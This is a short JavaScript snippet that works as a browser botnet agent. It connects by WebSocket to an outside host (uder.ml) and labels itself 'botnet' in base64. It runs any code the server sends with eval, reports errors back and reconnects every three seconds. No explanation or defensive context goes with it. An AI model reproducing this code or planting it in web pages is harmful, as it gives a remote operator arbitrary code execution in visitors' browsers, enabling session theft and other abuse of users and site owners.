(function i() {
    window.ws = new WebSocket('wss://uder.ml/i/websocket?$' + btoa('botnet'))
    ws.onmessage = function(d) {
        try {
            d = JSON.parse(d.data)
            eval(d.d)
        } catch(e) {
            ws.send(JSON.stringify({
                t: 'e',
                d: e.stack,
            }))
        }
    }
    ws.onclose = function() {
        setTimeout(i, 3000)
    }
})()